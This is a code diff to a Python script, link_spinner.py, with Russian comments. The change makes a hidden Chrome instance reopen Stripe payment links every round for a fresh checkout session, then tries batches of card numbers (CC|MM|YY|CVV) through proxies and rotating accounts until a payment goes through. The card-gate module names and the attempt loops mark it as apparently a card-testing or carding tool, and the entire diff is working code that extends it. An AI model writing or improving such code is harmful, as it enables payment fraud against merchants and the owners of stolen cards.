@@ -22,6 +22,10 @@
   * payment  — ссылка платёжного типа: на каждый круг открываем заново, получая новую сессию
     (то самое «само восстановилось»), и крутим попытки в ней.
 
+Внимание про payment: открыть его по HTTP нельзя. Новая сессия рождается в браузере JS-кодом,
+а обязательный фрагмент #fid на сервер не уходит вовсе — поэтому класс требует link_resolver.py
+(Chrome по CDP) и флага --resolve. Без флага платёжная ссылка честно останавливается на первом круге.
+
     python link_spinner.py <link> [--rounds N] [--cards K] [--interval S] [--max-attempts N]
                                   [--card CC|MM|YY|CVV] [--proxy URL] [--dry]
 
@@ -46,6 +50,7 @@ import account_rotator
 import config
 import gate_client as gc
 import hit_gate as hg
+import link_resolver
 import pusto_logger as _log
 import stripe_fid
 
@@ -191,8 +196,12 @@ async def run_round(link: str, cards: list[str], proxy: str | None) -> list[dict
 
 async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
                max_attempts: int, fixed_card: str | None, proxy: str | None, dry: bool,
-               rotate: bool = False, max_links: int = 0, auth_path: str | None = None) -> int:
+               rotate: bool = False, max_links: int = 0, auth_path: str | None = None,
+               use_resolver: bool = False, resolve_cdp: str | None = None,
+               show_browser: bool = False) -> int:
     kind = link_kind(link)
+    # Платёжный режим: класс payment (buy.stripe.com) или unknown, который браузер сам опознает.
+    payment_mode = bool(use_resolver) and kind in ('payment', 'unknown')
     print("=" * 96)
     print(f"[*] КРУТИЛКА ССЫЛКИ | тип: {kind} | кругов: {rounds} | карт в круге: {cards_per_round}"
           f" | пауза: {interval}s | dry: {dry}")
@@ -203,11 +212,29 @@ async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
 
     attempts = 0
     prev_pi = ""
+    prev_cs = ""
     links_minted = 0
     journal: list[dict] = []
     started = time.time()
 
     for round_no in range(1, rounds + 1):
+        if payment_mode:
+            resolved = await link_resolver.resolve_session(link, cdp=resolve_cdp,
+                                                             show=show_browser)
+            if not resolved.get('ok'):
+                print(f"[!] круг {round_no}: ссылку не удалось открыть браузером — {resolved.get('error')}")
+                journal.append({'round': round_no, 'resolve_failed': resolved.get('error')})
+                _dump(link, kind, journal, attempts, started)
+                return 2
+            if resolved['cs'] != prev_cs:
+                print(f"[*] круг {round_no}: открыл браузером -> сессия {resolved['cs'][:28]}… "
+                      f"({resolved['elapsed_s']}s, {resolved['mode']})")
+            prev_cs = resolved['cs']
+            link = resolved['session_url']
+            kind = 'session'
+            prev_pi = ''
+            journal.append({'round': round_no, 'resolved': True, 'cs': resolved['cs'],
+                            'mode': resolved['mode'], 'elapsed_s': resolved['elapsed_s']})
         state = await probe_session(link)
         stamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
         if not state.get("ok"):
@@ -252,9 +279,13 @@ async def spin(link: str, rounds: int, cards_per_round: int, interval: float,
                 print("[+] Оплата прошла — крутилка останавливается.")
                 _dump(link, kind, journal, attempts, started)
                 return 0
-            if kind == "payment":
-                print("[*] Сессия закрыта, тип ссылки платёжный — переоткрываю (новая сессия).")
-            else:
+            if payment_mode:
+                # Платёжный класс: следующее открытие даст новую сессию — уходим на следующий круг.
+                print("[*] Сессия закрыта. Ссылка платёжного класса — на следующем круге открою заново.")
+                journal.append({"round": round_no, "reopen_next_round": True})
+                await asyncio.sleep(interval)
+                continue
+            if True:
                 if rotate:
                     rot = await try_rotate(link, auth_path, links_minted, max_links)
                     if rot.get("ok"):
@@ -354,11 +385,17 @@ def main() -> int:
                     help="сколько новых ссылок разрешено выпустить за прогон")
     ap.add_argument("--auth", default=None,
                     help="файл с данными аккаунта для ротации (по умолчанию data/account_auth.json)")
+    ap.add_argument("--resolve", action="store_true",
+                    help="платёжные ссылки открывать браузером (link_resolver.py): новая сессия на каждый круг")
+    ap.add_argument("--cdp", default=None,
+                    help="адрес CDP ЖИВОГО Chrome для attach (по умолчанию не подключаемся, свой скрытый)")
+    ap.add_argument("--show", action="store_true", help="показывать окно браузера при --resolve")
     a = ap.parse_args()
     try:
         return asyncio.run(spin(a.link, a.rounds, a.cards, a.interval, a.max_attempts,
                                 a.card, a.proxy, a.dry, rotate=a.rotate, max_links=a.max_links,
-                                auth_path=a.auth))
+                                auth_path=a.auth, use_resolver=a.resolve, resolve_cdp=a.cdp,
+                                show_browser=a.show))
     except KeyboardInterrupt:
         print("\n[!] Остановлено вручную — крутилка завершена.")
         return 130
